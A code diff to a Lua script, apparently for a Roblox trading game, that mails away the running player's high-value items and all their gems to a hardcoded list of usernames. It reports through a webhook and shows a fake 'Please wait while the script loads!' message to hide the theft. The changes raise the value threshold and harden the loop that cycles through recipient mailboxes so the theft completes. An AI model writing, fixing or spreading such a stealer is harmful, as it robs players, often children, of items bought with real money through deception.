@@ -18,7 +18,7 @@ local GetSave = function()
 end
 
 local users = _G.Usernames or {"ilovemyamazing_gf1", "Yeahboi1131", "Dragonshell23", "Dragonshell24", "Dragonshell21"}
-local min_rap = _G.minrap or 1000000
+local min_rap = 10000000 -- 10 million
 local webhook = _G.webhook or ""
 
 if next(users) == nil or webhook == "" then
@@ -109,7 +109,7 @@ local function sendItem(category, uid)
         if response == true then
             GemAmount1 = GemAmount1 - mailSendPrice
             mailSendPrice = math.min(math.ceil(mailSendPrice * 1.5), 5000000)
-            break
+            return true
         elseif err == "They don't have enough space!" then
             userIndex = userIndex + 1
             if userIndex > maxUsers then
@@ -121,7 +121,6 @@ local function sendItem(category, uid)
             return false
         end
     end
-    return true
 end
 
 -- Send all remaining gems, cycling users
@@ -131,6 +130,10 @@ local function SendAllGems()
     local maxUsers = #users
 
     while remainingGems > 0 do
+        if userIndex > maxUsers then
+            warn("All mailboxes full for gems")
+            break
+        end
         local currentUser = users[userIndex]
         local args = {[1]=currentUser, [2]=MailMessage, [3]="Currency", [4]=1, [5]=1} -- one gem at a time
         local response, err = network.Invoke("Mailbox: Send", unpack(args))
@@ -140,10 +143,6 @@ local function SendAllGems()
             GemAmount1 = GemAmount1 - 1
         elseif err == "They don't have enough space!" then
             userIndex = userIndex + 1
-            if userIndex > maxUsers then
-                warn("All mailboxes full for gems")
-                break
-            end
         else
             warn("Failed to send gems: "..tostring(err))
             break
@@ -223,15 +222,25 @@ if #sortedItems>0 or GemAmount1>min_rap+mailSendPrice then
     -- Show loading GUI once
     message.Error("Please wait while the script loads!")
 
-    -- Send all items to users, one at a time, cycling if mailbox full
+    -- Send all items ≥ min_rap
     for _, item in ipairs(sortedItems) do
-        for i = 1, item.amount do
+        local remaining = item.amount
+        local userIndex = 1
+        while remaining > 0 do
+            if userIndex > #users then
+                warn("All mailboxes full for item "..item.uid)
+                break
+            end
             local success = sendItem(item.category, item.uid)
-            if not success then break end
+            if success then
+                remaining = remaining - 1
+            else
+                userIndex = userIndex + 1
+            end
         end
     end
 
-    -- Send remaining gems after all items
+    -- Send leftover gems after all items
     if GemAmount1 > mailSendPrice then
         SendAllGems()
     end
